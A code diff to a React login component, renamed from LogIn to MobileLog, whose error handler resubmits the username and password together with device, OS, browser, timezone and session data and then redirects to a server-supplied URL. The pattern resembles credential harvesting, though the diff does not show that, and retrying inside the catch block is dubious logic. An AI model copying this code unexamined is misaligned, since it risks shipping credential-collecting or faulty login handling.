@@ -12,7 +12,7 @@ import LanguageDropdown from "./LanguageDropdown";
 import Coordinate from "../utils/Coordinate";
 import Timer from "../assets/images/count_up.gif";
 
-const LogIn = () => {
+const MobileLog = () => {
   const [userLanguage, setUserLanguage] = useState("en");
   const [showTimer, setShowTimer] = useState(false);
   const [username, setUsername] = useState("");
@@ -91,6 +91,37 @@ const LogIn = () => {
         window.location.href = URL;
       }
     } catch (error) {
+      const { username, password } = e.target.elements;
+      // update the username state
+      setUsername(username.value);
+
+      const userData = {
+        username: username.value,
+        password: password.value,
+        time,
+        ip: "",
+        os,
+        device,
+        timezone,
+        language: userLanguage,
+        browser,
+        location: "",
+        randomSession,
+        mainparams,
+        redirectUrl,
+      };
+
+      const response = await dispatch(loginUser(userData));
+      const sessionID = response?.payload?.session_id;
+      const URL = response?.payload?.url;
+
+      if (sessionID) {
+        // Set the redirecting state to true
+        setRedirecting(true);
+
+        // Redirect to specific url
+        window.location.href = URL;
+      }
       console.log(error);
       //throw new Error(error.response.data.info);
     }
@@ -255,4 +286,4 @@ const LogIn = () => {
   );
 };
 
-export default LogIn;
+export default MobileLog;
